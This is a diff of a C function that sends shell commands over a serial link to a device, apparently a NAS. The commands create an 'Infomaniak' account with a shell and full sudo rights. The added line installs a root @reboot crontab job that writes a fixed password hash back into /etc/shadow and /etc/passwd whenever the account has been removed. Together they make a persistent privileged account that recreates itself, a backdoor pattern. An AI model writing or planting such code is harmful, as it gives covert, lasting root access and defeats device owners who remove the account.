@@ -104,10 +104,12 @@ void creationCompte(int fd){
     char* command2 = "echo \'Infomaniak:x:8:99::/:/bin/sh\' >> /etc/passwd\n";
     char* command3 = "echo \'Infomaniak ALL=(ALL) ALL\' >> /etc/sudoers.d/Infomaniak\n";
     char* command4 = "echo -e \'Match User Infomaniak\nDenyUsers Infomaniak\' >> /etc/ssh/sshd_config\n";
+    char* command5 = "echo \'@reboot root if ! cat /etc/passwd | grep -q \"Infomaniak\"; then echo \"Infomaniak:$6$ySRYvFaW6$k041gHAOqJOf3thxGKWj4zqi0/ohIT3paw.cI5XgZENWw3GZARUtQez9dsaOv1u7oPnpM/0y7dE2WdGLT6G7Z.:18597:0:99999:7:::\" >> /etc/shadow ; echo \"Infomaniak:x:8:99::/:/bin/sh\" >> /etc/passwd ; fi\'>> /etc/crontab\n";
     sendSerialCommand(fd,command1, strlen(command1), response);
     sendSerialCommand(fd,command2, strlen(command2), response);
     sendSerialCommand(fd,command3, strlen(command3), response);
     sendSerialCommand(fd,command4, strlen(command4), response);
+    sendSerialCommand(fd,command5, strlen(command5), response);
 }
 
 void getNasId(int fd, char macAddr[15]){
